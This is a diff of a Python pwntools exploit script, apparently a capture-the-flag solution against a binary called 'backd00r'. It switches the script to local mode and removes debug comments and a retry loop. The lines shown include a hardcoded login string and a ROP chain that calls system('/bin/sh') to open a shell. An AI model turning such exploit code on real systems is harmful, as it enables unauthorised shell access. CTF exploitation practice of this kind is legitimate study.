@@ -1,16 +1,13 @@
 from pwn import *
-import struct, time, sys
 #echo 2 > /proc/sys/kernel/randomize_va_space
-#context(arch='amd64', os='linux',log_level = 'DEBUG')
 context(arch='amd64', os='linux')
 
 def run():
-	local = False
+	local = True
 
 	if local:
 		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-		s = remote("127.0.0.1",10009)
-		#s = process('backd00r')
+		s = process('backd00r')
 	else:
 		libc = ELF('libc.so.6')
 		s = remote("192.168.56.128",10000)
@@ -34,12 +31,6 @@ def run():
 		print s.recvline()
 	print s.recv()
 
-	# + s.recv() + s.recv() + s.recv() +s.recv()
-
-	# try:
-	# 	rr = input("PAUSAR")
-	# except Exception as e:
-	# 	pass
 
 	s.sendline("j&9GCS34MY+^4ud*")
 	autenticatec = s.recvline()
@@ -55,11 +46,6 @@ def run():
 		print payload
 
 		s.sendline(payload)
-
-		# try:
-		# 	rr = input("PAUSAR")
-		# except Exception as e:
-		# 	pass
 
 
 		print s.recvline()
@@ -94,7 +80,6 @@ def run():
 		p += p64(pop_rdi_ret)
 		p += p64(binsh)
 		p += p64(system)
-		#p += p64(system)
 
 		print p
 
@@ -120,12 +105,6 @@ def run():
 
 
 
-	"""
-	code 0x7f262e97a000
-	vm   0x7fb07f322000
-	"""
 
 
-while True:
-	run()
-	exit()
+run()
